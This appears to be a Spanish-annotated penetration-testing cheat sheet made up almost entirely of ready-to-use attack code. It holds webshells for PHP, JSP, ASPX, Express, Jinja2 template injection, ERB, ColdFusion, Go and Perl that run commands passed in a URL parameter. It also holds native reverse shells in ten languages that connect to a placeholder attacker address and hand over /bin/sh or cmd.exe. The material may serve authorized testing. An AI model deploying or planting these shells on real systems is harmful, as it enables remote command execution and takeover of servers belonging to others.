---
tags:
  - webapp
  - RCE
  - webshell
---
```php
// [Webshell] (Uso: http://target/shell.php?cmd=whoami)
<?php 
    if(isset($_REQUEST['cmd'])){
        system($_REQUEST['cmd']); 
    }
?>
```

```php
// [Reverse shell] (Nativa, sin llamar a nc/bash en el system)
<?php 
    $ip = "TU_IP"; 
    $port = TU_PUERTO; 
    $sock = fsockopen($ip, $port); 
    $proc = proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes); 
?>
```
---
```java
// [Webshell] (JSP) (Uso: http://target/shell.jsp?cmd=whoami)
<%@ page import="java.io.*" %>
<% 
    if (request.getParameter("cmd") != null) {
        Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
        InputStream in = p.getInputStream();
        int a = -1;
        byte[] b = new byte[2048];
        while((a=in.read(b))!=-1){ out.println(new String(b)); }
    }
%>
```

```java
// [Reverse shell] (Nativa)
public class RevShell {
    public static void main(String[] args) throws Exception {
        String host = "TU_IP";
        int port = TU_PUERTO;
        String cmd = "/bin/sh";
        Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
        java.net.Socket s = new java.net.Socket(host, port);
        java.io.InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
        java.io.OutputStream po = p.getOutputStream(), so = s.getOutputStream();
        while(!s.isClosed()){
            while(pi.available() > 0) so.write(pi.read());
            while(pe.available() > 0) so.write(pe.read());
            while(si.available() > 0) po.write(si.read());
            so.flush(); po.flush();
            Thread.sleep(50);
            try { p.exitValue(); break; } catch (Exception e){}
        }
        p.destroy(); s.close();
    }
}
```
---
```C#
// [Webshell] (ASPX) (Uso: http://target/shell.aspx?cmd=whoami)
<%@ Page Language="C#" Debug="true" %>
<%@ Import Namespace="System.Diagnostics" %>
<% 
    if (Request.QueryString["cmd"] != null) {
        Process p = new Process();
        p.StartInfo.FileName = "cmd.exe";
        p.StartInfo.Arguments = "/c " + Request.QueryString["cmd"];
        p.StartInfo.UseShellExecute = false;
        p.StartInfo.RedirectStandardOutput = true;
        p.Start();
        Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
    }
%>
```

```C#
// [Reverse shell] (Nativa)
using System.Diagnostics;
using System.Net.Sockets;
using System.IO;

class RevShell {
    static void Main() {
        TcpClient c = new TcpClient("TU_IP", TU_PUERTO);
        Stream s = c.GetStream();
        StreamReader r = new StreamReader(s);
        StreamWriter w = new StreamWriter(s);
        Process p = new Process();
        p.StartInfo.FileName = "cmd.exe"; // o /bin/bash en Linux
        p.StartInfo.CreateNoWindow = true;
        p.StartInfo.UseShellExecute = false;
        p.StartInfo.RedirectStandardOutput = true;
        p.StartInfo.RedirectStandardInput = true;
        p.StartInfo.RedirectStandardError = true;
        p.OutputDataReceived += new DataReceivedEventHandler((sender, e) => { if (e.Data != null) w.WriteLine(e.Data); w.Flush(); });
        p.ErrorDataReceived += new DataReceivedEventHandler((sender, e) => { if (e.Data != null) w.WriteLine(e.Data); w.Flush(); });
        p.Start();
        p.BeginOutputReadLine();
        p.BeginErrorReadLine();
        StreamWriter pIn = p.StandardInput;
        pIn.AutoFlush = true;
        string line = "";
        while ((line = r.ReadLine()) != null) pIn.WriteLine(line);
        p.WaitForExit();
    }
}
```
---
```Node.js
// [Webshell] (Inyección en entorno Express) (Uso: /ruta?cmd=whoami)
require('child_process').exec(req.query.cmd, function(err, stdout, stderr) {
    res.send("<pre>" + stdout + "</pre>");
});
```

```Node.js
// [Reverse shell] (Nativa)
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(TU_PUERTO, "TU_IP", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Retorno dummy para evitar cuelgues
})();
```
---
```python
// [Webshell] (Inyección SSTI en Flask/Jinja2) (Uso: ?cmd=whoami)
{{ config.__class__.__init__.__globals__['os'].popen(request.args.get('cmd')).read() }}
```

```python
// [Reverse shell] (Nativa)
import socket, subprocess, os
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("TU_IP", TU_PUERTO))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
subprocess.call(["/bin/sh", "-i"])
```
---
```ruby
// [Webshell] (ERB Template) (Uso: ?cmd=whoami)
<%= `#{params[:cmd]}` %>
```

```ruby
// [Reverse shell] (Nativa)
require 'socket'
s = TCPSocket.new("TU_IP", TU_PUERTO)
STDIN.reopen(s)
STDOUT.reopen(s)
STDERR.reopen(s)
exec("/bin/sh -i")
```
---
```ColdFusion
// [Webshell] (CFML) (Uso: ?cmd=whoami)
<cfif isDefined("url.cmd")>
    <cfexecute name="cmd.exe" arguments="/c #url.cmd#" timeout="10" variable="output"></cfexecute>
    <cfoutput><pre>#output#</pre></cfoutput>
</cfif>
```

```ColdFusion
// [Reverse shell] (Nativa usando Java Subyacente)
<cfscript>
    host = "TU_IP";
    port = TU_PUERTO;
    socket = createObject("java", "java.net.Socket").init(host, port);
    inStream = socket.getInputStream();
    outStream = socket.getOutputStream();
    process = createObject("java", "java.lang.ProcessBuilder").init(["/bin/sh", "-i"]).redirectErrorStream(true).start();
    procIn = process.getInputStream();
    procOut = process.getOutputStream();
    
    // El bucle de lectura/escritura en CFML puro suele colgar el hilo si no se maneja asíncronamente,
    // pero la lógica invoca las clases Process y Socket de Java vistas en el punto 2.
</cfscript>
```
---
```Go
// [Webshell] (Ruta inyectada en router) (Uso: /cmd?cmd=whoami)
http.HandleFunc("/cmd", func(w http.ResponseWriter, r *http.Request) {
    out, _ := exec.Command("sh", "-c", r.URL.Query().Get("cmd")).Output()
    w.Write(out)
})
```

```Go
// [Reverse shell] (Nativa)
package main
import (
    "os/exec"
    "net"
)
func main() {
    c, _ := net.Dial("tcp", "TU_IP:TU_PUERTO")
    cmd := exec.Command("/bin/sh")
    cmd.Stdin = c
    cmd.Stdout = c
    cmd.Stderr = c
    cmd.Run()
}
```
---
```Perl
// 9. Perl

// [Webshell] (CGI Script) (Uso: ?cmd=whoami)
#!/usr/bin/perl
use CGI;
my $cgi = CGI->new;
print $cgi->header("text/plain");
my $cmd = $cgi->param('cmd');
print system($cmd);
```

```Perl
use Socket;
my $ip = "TU_IP";
my $port = TU_PUERTO;
socket(S, PF_INET, SOCK_STREAM, getprotobyname("tcp"));
if(connect(S, sockaddr_in($port, inet_aton($ip)))){
    open(STDIN, ">&S");
    open(STDOUT, ">&S");
    open(STDERR, ">&S");
    exec("/bin/sh -i");
}
```
---
```C++
// [Reverse shell] (Nativa en sistemas POSIX)

#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(void){
    int port = TU_PUERTO;
    struct sockaddr_in revsockaddr;
    int sockt = socket(AF_INET, SOCK_STREAM, 0);
    
    revsockaddr.sin_family = AF_INET;
    revsockaddr.sin_port = htons(port);
    revsockaddr.sin_addr.s_addr = inet_addr("TU_IP");
    
    connect(sockt, (struct sockaddr *) &revsockaddr, sizeof(revsockaddr));
    
    dup2(sockt, 0); // STDIN
    dup2(sockt, 1); // STDOUT
    dup2(sockt, 2); // STDERR
    
    char * const argv[] = {"/bin/sh", NULL};
    execve("/bin/sh", argv, NULL);
    
    return 0;
}
```
